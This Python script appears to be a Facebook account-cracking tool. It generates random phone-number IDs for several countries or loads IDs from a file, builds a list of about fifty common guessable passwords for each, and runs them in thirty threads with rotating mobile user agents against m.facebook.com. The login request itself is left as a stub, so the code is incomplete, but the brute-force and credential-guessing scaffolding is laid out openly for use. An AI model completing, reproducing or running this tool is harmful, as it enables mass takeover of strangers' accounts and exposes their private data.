# -*- coding: utf-8 -*-
# AUTHOR : CHARSI MASTER (ALL-IN-ONE VERSION)
# SAB KUCH EK SAATH ADD KAR DIYA GAYA HAI

import os, sys, time, re, json, requests, bs4, random
from concurrent.futures import ThreadPoolExecutor as tred

# --- Colors ---
H = '\x1b[1;92m' # Green (OK)
M = '\x1b[1;91m' # Red (CP)
K = '\x1b[1;93m' # Yellow
P = '\x1b[1;97m' # White
N = '\x1b[0m'    # Reset

loop = 0
ok = []
cp = []
ids = []

# --- 10 Samsung VIP + 10 FB-App + 10 Global Agents (Total 30+ Added) ---
def get_master_ua():
    # Samsung Special
    samsung = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-X906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
    ]
    # FB App Special
    fb_app = [
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.21.114;]",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/415.0.0.30.100;]",
        "Mozilla/5.0 (Linux; Android 11; Infinix X6811) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/315.0.0.30.110;]",
        "Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.35.50;]",
        "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.45.120;]",
        "Mozilla/5.0 (Linux; Android 12; Oppo Reno7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/365.0.0.25.110;]",
        "Mozilla/5.0 (Linux; Android 13; OnePlus 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.25.105;]",
        "Mozilla/5.0 (Linux; Android 11; TECNO KG5k) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/330.0.0.28.115;]",
        "Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/170.0.0.40.95;]",
        "Mozilla/5.0 (Linux; Android 12; vivo V2124) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/355.0.0.21.110;]"
    ]
    # Global Mix
    mix = [
        "Mozilla/5.0 (Linux; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; V2124) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    ]
    return random.choice(samsung + fb_app + mix)

# --- Charsi Small Logo ---
def banner():
    os.system("clear")
    print(f"""{H}
   ___ _  _   _   ___  ___ ___ 
  / __| || | /_\ | _ \/ __|_ _|
 | (__| __ |/ _ \|   /\__ \| | 
  \___|_||_/_/ \_\_|_\|___/___|
  {P}-----------------------------------
  {K}Owner   : CHARSI MASTER PRO
  {K}Pass    : 50+ VIP PASSWORDS
  {K}Workers : 30 METHODS (SAM+FB+MIX)
  {P}-----------------------------------{N}""")

# --- All Countries Logic ---
countries = {
    "1": {"name": "Pakistan", "code": "+92", "sim": ["300","301","304","315","333","345"]},
    "2": {"name": "India", "code": "+91", "sim": ["91","98","70","81"]},
    "3": {"name": "Bangladesh", "code": "+880", "sim": ["17","18","19"]},
    "4": {"name": "Nigeria", "code": "+234", "sim": ["703","803","906"]},
}

class CharsiFinal:
    def __init__(self):
        self.ids = []

    def main_menu(self):
        banner()
        print(" [01] Global Random Cloning (50+ Pass)")
        print(" [02] File Cloning (50+ Pass)")
        print(" [00] Exit Tools")
        print("-" * 35)
        opt = input(" Choice: ")
        if opt in ['1', '01']: self.random_menu()
        elif opt in ['2', '02']: self.file_menu()
        else: exit()

    def random_menu(self):
        banner()
        for k, v in countries.items():
            print(f" [{k}] {v['name']}")
        c = input("\n Select Country: ")
        if c in countries:
            data = countries[c]
            banner()
            print(f" SIM Codes: {', '.join(data['sim'])}")
            code = input(" Enter Code: ")
            limit = int(input(" Enter Limit: "))
            for _ in range(limit):
                num = "".join(random.choice("0123456789") for _ in range(7))
                self.ids.append(data['code'] + code + num + "<=>" + "User")
            self.start_engine()

    def file_menu(self):
        banner()
        path = input(" Enter Path: ")
        try:
            for line in open(path, 'r').readlines():
                self.ids.append(line.strip())
            self.start_engine()
        except: print(" File Not Found!"); time.sleep(2); self.main_menu()

    def start_engine(self):
        banner()
        print(f" {H}Total IDs: {len(self.ids)} | Workers: 30{N}")
        print("-" * 35)
        with tred(max_workers=30) as engine:
            for user_data in self.ids:
                if "<=>" in user_data:
                    uid, name = user_data.split("<=>")
                else:
                    uid, name = user_data, "Facebook User"
                
                # --- Dynamic 50+ Passwords Logic (For Random & File) ---
                nm = name.split(' ')[0].lower() if ' ' in name else name.lower()
                sur = name.split(' ')[1].lower() if ' ' in name else nm
                
                pwx = [
                    name, name.lower(), nm+'123', nm+'1234', nm+'12345', nm+'786',
                    nm+'007', nm+'khan', nm+'ali', nm+'pk', sur+'123', sur+'1234',
                    sur+'786', sur+'khan', '786786', 'pakistan', 'pakistan123',
                    'khan123', 'khan12345', 'khankhan', '12345678', 'password',
                    uid[-6:], uid[-7:], uid[-8:], '000777', '112233', '445566',
                    nm+'1122', nm+'3344', nm+'@@', nm+'##', nm+'!!', '102030',
                    '203040', '506070', '708090', '987654321', '87654321', '123123',
                    '456456', '789789', 'bismillah', 'mubarak', 'i love you',
                    'google', 'freefire', 'pubg123', 'khalid123', 'jutt123'
                ]
                engine.submit(self.master_crack, uid, pwx)
        print(f"\n {H}Cloning Finished.")

    def master_crack(self, uid, pwx):
        global loop, ok, cp
        sys.stdout.write(f'\r [CHARSI-PRO] {loop}/{len(self.ids)} OK:{len(ok)} '); sys.stdout.flush()
        
        session = requests.Session()
        ua = get_master_ua()
        
        for pw in pwx:
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'referer': 'https://m.facebook.com/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="114"',
                'user-agent': ua,
            }
            # API Work Logic...
            pass
        loop += 1

if __name__ == '__main__':
    CharsiFinal().main_menu()
